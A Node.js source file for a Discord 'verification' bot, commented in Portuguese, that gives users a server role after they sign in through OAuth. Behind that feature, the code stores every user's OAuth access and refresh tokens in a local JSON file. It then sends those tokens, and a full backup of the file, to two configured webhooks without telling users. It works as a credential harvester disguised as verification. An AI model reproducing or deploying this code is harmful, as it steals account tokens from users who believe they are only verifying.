//CRIE UM README PARA ESSE CODIGO 
const Discord = require("discord.js");
const client = new Discord.Client({
  intents: 32767,
});
const configs = require("./configs");
const chalk = require("chalk");
const fs = require("fs");
const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const FormData = require("form-data");
const axios = require("axios");

// Adicionando middleware body-parser para interpretar o corpo da requisição como texto
app.use(bodyParser.text());

app.get("/", function (req, res) {
  //Envia o arquivo index.html para o cliente
  res.sendFile(__dirname + "/index.html");
});

app.get("/auth", async (req, res) => {
  //Lê o arquivo object.json e o envia como resposta no formato JSON
  fs.readFile("./object.json", function (err, data) {
    return res.json(JSON.parse(data));
  });
});

app.post("/", async (req, res) => {
  try {
    
    //Obtem os dados do formulário
    const form = getFormData(req);

    //Obtem as informações de token
    const tokenInfo = await getToken(form);

    //Obtem as informações do usuário
    const userInfo = await getUserInfo(tokenInfo);

    //Exporta as informações do usuário
    module.exports = { userInfo };

    var infos = {
      username: userInfo.username + "#" + userInfo.discriminator,
      userID: userInfo.id,
      access_token: tokenInfo.access_token,
      refresh_token: tokenInfo.refresh_token,
    };

    //Escreve as informações do usuário no arquivo object.json
    let objectArray = [];
    let file = JSON.parse(fs.readFileSync("./object.json", "utf8"));
    objectArray = file;

    if (objectArray.map((e) => e.userID).includes(userInfo.id)) {
      console.log(chalk.blue(`[!] - ${userInfo.username}#${userInfo.discriminator} Já está no Banco de Dados`));
    } else {
      console.log(chalk.green(`[+] - ${userInfo.username} # ${userInfo.discriminator}`));
      objectArray.push(infos);
      fs.writeFileSync("./object.json", JSON.stringify(objectArray, null, 2));
    }

    //Envia o webhook com as informações do usuário
    await sendWebhook(infos);

    //Envia o webhook com o backup do arquivo object.json
    await sendWebhookBackup();

    //tag pro usuario apos verificar parte 1
    client.emit("usuarioAutenticado", userInfo.id);
    
  } catch (error) {
    //Exibe o erro no console
    console.error(error);
  }
});

//Função para obter os dados do formulário
function getFormData(req) {
  let form = new FormData();
  form.append("client_id", configs.client_id);
  form.append("client_secret", configs.client_secret);
  form.append("grant_type", "authorization_code");
  form.append("redirect_uri", configs.redirect_uri);  form.append("code", req.body);
  return form;
}

//Função para obter o token
async function getToken(form) {
  const response = await fetch("https://discordapp.com/api/oauth2/token", {
    method: "POST",
    body: form,
  });
  return response.json();
}

//Função para obter as informações do usuário
async function getUserInfo(tokenInfo) {
  const headers = {
    headers: {
      authorization: `${tokenInfo.token_type} ${tokenInfo.access_token}`,
    },
  };

  try {
    const response = await axios.get("https://discordapp.com/api/users/@me", headers);
    return response.data;
  } catch (error) {
    if (error.response.status === 401) {
      // Erro de autorização
      console.log("[BOT] Erro de autorização.");
    } else {
      // Outro erro
      console.log(error);
    }
  }
}

//Função para enviar o webhook com as informações do usuário
async function sendWebhook(infos) {
  const data = {
    embeds: [
      {
        color: "000000",
        title: `\`🔥\`・NOVO USUÁRIO`,
        thumbnail: {
          url: `https://cdn.discordapp.com/attachments/1064679607644725299/1064685992071675974/755490897143136446.gif`,
        },
        description:
          ` User: \`${infos.username}\`` +
          `\n\n ID: \`${infos.userID}\`` +
          `\n\n Acces Token: \`${infos.access_token}\`` +
          `\n\n Refresh Token: \`${infos.refresh_token}\``,
      },
    ],
  };
  await fetch(`${configs.webhook}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
}

//Função para enviar o webhook com o backup do arquivo object.json
async function sendWebhookBackup() {
  let form = new FormData();
  form.append("files[0]", fs.createReadStream("./object.json"), {
    filename: "object.json",
    contentType: "application/json",
  });

  form.append(
    "payload_json",
    JSON.stringify({
      attachments: [
        {
          id: 0,
          description: "Some description",
          filename: "object.json",
        },
      ],
    })
  );
  await axios({
    method: "POST",
    url: configs.webhookBackup,
    data: form,
    headers: { "Content-Type": "multipart/form-data" },
  });
}

//tag pro usuario apos clicar parte 2
client.on("usuarioAutenticado", async (userID) => {
  try {
    const guild = await client.guilds.fetch(configs.idserver);
    const member = await guild.members.fetch(userID);
    const cargo = await guild.roles.fetch(configs.idrole);

    if (member.roles.cache.has(cargo.id)) {
      console.log(`[BOT] Usuário já tem este cargo!`);
    } else {
      member.roles.add(cargo);
      console.log(`[BOT] Cargo: ${cargo.name} adicionado com sucesso!`);
    }
  } catch (err) {
    console.log(`[BOT] Usuário não está no servidor ou cargo não existe.`);
  }
});

//SLASHCOMMANDS
client.on("interactionCreate", (interaction) => {
  if (interaction.type === Discord.InteractionType.ApplicationCommand) {
    const cmd = client.slashCommands.get(interaction.commandName);

    if (!cmd) return interaction.reply(`Error`);

    interaction["member"] = interaction.guild.members.cache.get(interaction.user.id);

    cmd.run(client, interaction);
  }
});

client.slashCommands = new Discord.Collection();

require("./handler")(client);

console.clear();

//MOSTRA INICIO DO BOT NO CONSOLE E CONFIGURA A PORTA
app.listen(configs.port, () => {
  console.log(chalk.magenta(`[BOT] Conectando na porta: ${configs.port}`));
});

client.on("ready", () => {
  console.log(chalk.magenta(`[BOT] Logado como: ${client.user.username}`));
  console.log(chalk.magenta(`[BOT] Meu prefixo: ${configs.prefix}`));
  console.log(
    chalk.magenta(
      `[BOT] Bot Invite: https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n`
    )
  );
  client.user.setActivity(`🔍・Checking you...`, { type: "WATCHING" });
});

//INICIA O BOT
client.login(configs.token).catch(() => {
  throw new Error(`TOKEN OU INTENT INVALIDO`);
});
